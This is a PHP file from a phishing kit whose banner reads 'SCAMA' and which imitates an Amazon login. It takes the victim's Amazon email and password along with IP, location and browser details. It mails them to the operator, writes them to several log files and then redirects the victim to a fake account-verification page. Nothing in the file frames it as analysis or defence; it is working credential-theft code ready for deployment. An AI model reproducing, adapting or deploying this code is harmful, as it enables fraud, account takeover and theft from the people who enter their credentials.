<?php
/* 
 _____  ________  ___ _____ _____ _   _ _____ _   _ _____    ___  ___  ___  ___   ___________ _   _   _____ _____   ___  ___  ___  ___  
/  ___||  _  |  \/  ||  ___|_   _| | | |_   _| \ | |  __ \  / _ \ |  \/  | / _ \ |___  /  _  | \ | | /  ___/  __ \ / _ \ |  \/  | / _ \ 
\ `--. | | | | .  . || |__   | | | |_| | | | |  \| | |  \/ / /_\ \| .  . |/ /_\ \   / /| | | |  \| | \ `--.| /  \// /_\ \| .  . |/ /_\ \
 `--. \| | | | |\/| ||  __|  | | |  _  | | | | . ` | | __  |  _  || |\/| ||  _  |  / / | | | | . ` |  `--. \ |    |  _  || |\/| ||  _  |
/\__/ /\ \_/ / |  | || |___  | | | | | |_| |_| |\  | |_\ \ | | | || |  | || | | |./ /__\ \_/ / |\  | /\__/ / \__/\| | | || |  | || | | |
\____/  \___/\_|  |_/\____/  \_/ \_| |_/\___/\_| \_/\____/ \_| |_/\_|  |_/\_| |_/\_____/\___/\_| \_/ \____/ \____/\_| |_/\_|  |_/\_| |_/
                                                                                                                                        
                                                                                                                                        
*/
session_start();
require "../functions/Mfunctions.php";
require "../functions/get_lang.php";
require "../functions/get_browser.php";
require "../../../config.php";
$from = $senderemail;
$headers = "From: $senderlogin <$from>";
$subject = "AMAZON SOMETHING [ ".$_SESSION['_LOOKUP_COUNTRY_']." - $ip ]";
$to = $Your_Email;
$data = "
.++======[ Amazon Login - Powered By SOMETHING ]======++.

    .++=====[ Amazon ]=====++.
Email       :   ".$_SESSION['_login_email_']."
Password    :   ".$_SESSION['_login_password_']."
        .++===[ End ]===++.

    .++=====[ PC Info ]=====++.
IP Address  :   ".$_SESSION['_LOOKUP_COUNTRY_']." - ".$_SESSION['_LOOKUP_REGIONS_']." ".$_SESSION['_LOOKUP_CITY_']." - ".$_SESSION['_ip_']."
Browser     :   ".SOME_Browser($_SERVER['HTTP_USER_AGENT'])." On ".SOME_OS($_SERVER['HTTP_USER_AGENT'])."
        .++===[ End ]===++.

.++======[ Powered By SOMETHING - Amazon Login ]======++.
";
mail($to,$subject,$data,$headers);
$empas   = "".$_SESSION['_login_email_']." | ".$_SESSION['_login_password_']." [ ".$_SESSION['_LOOKUP_COUNTRY_']." ]\n";
$file1 = "../../../logs/some-acc.log";
 $isi1  = @file_get_contents($file1);
   $buka1 = fopen($file1,"a");
    fwrite($buka1, $empas);
    fclose($buka1);
    
$file2 = "../../../logs/some-login.txt";
$isi  = @file_get_contents($file2);
$buka = fopen($file2,"w"); 
fwrite($buka, $isi+1);
fclose($buka);
    
    $see = fopen("../../../logs/some-log.txt","a");
    $jam = date("h:i:sa");
    fwrite($see,"[ $jam - ".$_SESSION['_ip_']." - ".$_SESSION['_LOOKUP_COUNTRY_']." - ".SOME_Browser($_SERVER['HTTP_USER_AGENT'])." - ".SOME_OS($_SERVER['HTTP_USER_AGENT'])." ] Login Amazon"."\n");
    fclose($see);
    
		$cadangan = "../../../logs/login-info.txt";
		$filecadangan = @fopen($cadangan, 'a+');
		@fwrite($filecadangan, $data);
		@fclose($filecadangan); //Cadangan kalo send email gak work
		
header("Location: ../404.php?verify_account=".sha1(microtime())."&dispatch=".sha1(microtime())."");
header("Location: ./safe?verify_youraccount=".sha1(microtime())."&dispatch=".sha1(microtime())."");
?>